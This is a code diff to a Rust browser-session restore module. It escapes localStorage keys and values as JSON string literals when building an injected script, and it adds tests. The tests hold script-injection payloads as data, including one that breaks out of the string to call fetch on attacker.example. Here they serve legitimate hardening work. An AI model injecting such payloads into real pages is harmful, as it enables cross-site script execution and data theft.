@@ -258,10 +258,19 @@ pub fn restore_cookies(browser: &Browser, file: &SessionFile, provider: &str) ->
 
 /// Restore step 2 (AFTER goto): localStorage is origin-scoped, so it can
 /// only be injected once the page sits on the provider origin.
+fn local_storage_restore_script(key: &str, value: &str) -> Option<String> {
+    let key = serde_json::to_string(key).ok()?;
+    let value = serde_json::to_string(value).ok()?;
+    Some(format!(
+        "try{{localStorage.setItem({key}, {value})}}catch(e){{}}"
+    ))
+}
+
 pub fn restore_local_storage(page: &Page, file: &SessionFile) {
     for (k, v) in &file.local_storage {
-        let script = format!("try{{localStorage.setItem({:?}, {:?})}}catch(e){{}}", k, v);
-        let _ = page.evaluate(&script);
+        if let Some(script) = local_storage_restore_script(k, v) {
+            let _ = page.evaluate(&script);
+        }
     }
 }
 
@@ -275,6 +284,33 @@ pub fn restore_session(browser: &Browser, page: &Page, provider: &str) -> Result
             Ok(true)
         }
         None => Ok(false),
+    }
+}
+
+#[cfg(test)]
+mod local_storage_script_tests {
+    use super::*;
+
+    #[test]
+    fn restore_script_uses_json_string_literals_for_keys_and_values() {
+        let key = "key\"\\\n雪";
+        let value = "\");alert(1);//\nline two\\tail";
+        let script = local_storage_restore_script(key, value).unwrap();
+
+        assert!(script.contains(&serde_json::to_string(key).unwrap()));
+        assert!(script.contains(&serde_json::to_string(value).unwrap()));
+        assert!(script.starts_with("try{localStorage.setItem("));
+        assert!(script.ends_with(")}catch(e){}"));
+    }
+
+    #[test]
+    fn restore_script_keeps_injection_shaped_values_inside_json_literal() {
+        let value = "\");fetch('https://attacker.example')//";
+        let script = local_storage_restore_script("session", value).unwrap();
+        let literal = serde_json::to_string(value).unwrap();
+
+        assert!(script.contains(&literal));
+        assert_eq!(serde_json::from_str::<String>(&literal).unwrap(), value);
     }
 }
 
